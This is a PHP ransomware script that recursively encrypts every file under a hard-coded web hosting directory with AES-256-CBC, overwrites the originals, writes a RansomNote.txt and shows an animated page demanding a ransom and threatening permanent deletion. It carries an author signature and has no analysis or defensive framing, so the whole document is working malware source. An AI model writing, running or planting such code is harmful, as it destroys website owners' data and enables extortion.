<?php

function encryptFile($file) {
    $key = "\x00\x20\x02\x20\x00\x10\x22\x01\xe0"; // Replace with your own secret key
    $encryptedContent = openssl_encrypt(file_get_contents($file), "AES-256-CBC", $key, 0, substr($key, 0, 16));
    file_put_contents($file, $encryptedContent);
}

function encryptDirectory($dir) {
    $dirContent = scandir($dir);

    foreach ($dirContent as $entry) {
        if ($entry !== "." && $entry !== "..") {
            $entryPath = $dir . "/" . $entry;

            if (is_dir($entryPath)) {
                encryptDirectory($entryPath);
            } else {
                encryptFile($entryPath);
            }
        }
    }
}

// Display the ransom message with glitch CSS and background transition
echo '<style>
    @keyframes colorChange {
        0% {
            background-color: blue;
        }
        100% {
            background-color: purple;
        }
    }

    @keyframes glitch {
        2%, 64% {
            transform: translate(2px, -2px);
        }
        4%, 60% {
            transform: translate(-2px, 2px);
        }
        62% {
            transform: translate(-1px, 1px);
        }
    }

    body {
        font-family: Arial, sans-serif;
        font-size: 20px;
        text-align: center;
    }

    h1 {
        color: white;
        font-size: 28px;
        animation: glitch 0.3s infinite;
    }

    p {
        color: white;
        font-size: 18px;
        animation: glitch 0.3s infinite;
    }

    .container {
        display: flex;
        flex-direction: column;
        align-items: center;
        justify-content: center;
        height: 100vh;
        overflow: hidden;
        animation: colorChange 5s infinite;
    }
</style>

<div class="container">
    <h1>Oops, your files have been encrypted!</h1>
    <p>To decrypt your files, you must pay a ransom.</p>
    <p>Contact us at [email protected] for payment details.</p>
    <p>Failure to comply will result in permanent deletion of your files.</p>
</div>';

$message = "Encrypted By MrSanZz, XD";
$targetDir = "/home/eiht3234/public_html";

encryptDirectory($targetDir);

// Create a ransom note file
$ransomNote = $targetDir . "/RansomNote.txt";
file_put_contents($ransomNote, $message);

?>